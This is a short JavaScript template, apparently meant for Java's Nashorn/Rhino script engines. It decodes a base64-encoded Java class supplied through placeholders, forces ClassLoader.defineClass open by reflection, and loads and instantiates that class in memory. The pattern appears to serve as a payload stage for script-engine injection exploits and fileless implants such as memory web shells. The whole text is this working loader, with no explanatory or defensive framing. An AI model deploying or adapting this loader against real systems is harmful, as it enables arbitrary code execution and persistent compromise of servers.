var base64Str = "{{base64Str}}";
var className = "{{className}}";
var clsString = java.lang.Class.forName("java.lang.String");
var bytecode;
try {
    var decoder = java.lang.Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
    bytecode = decoder.getClass().getMethod("decode", clsString).invoke(decoder, base64Str);
} catch (ee) {
    var decoder = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance();
    bytecode = decoder.getClass().getMethod("decodeBuffer", clsString).invoke(decoder, base64Str);
}
var clsByteArray = (new java.lang.String("a").getBytes().getClass());
var clsInt = java.lang.Integer.TYPE;
var defineClass = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", [clsString, clsByteArray, clsInt, clsInt]);
defineClass.setAccessible(true);
var clazz = defineClass.invoke(new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0),java.lang.Thread.currentThread().getContextClassLoader()), className, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
clazz.newInstance();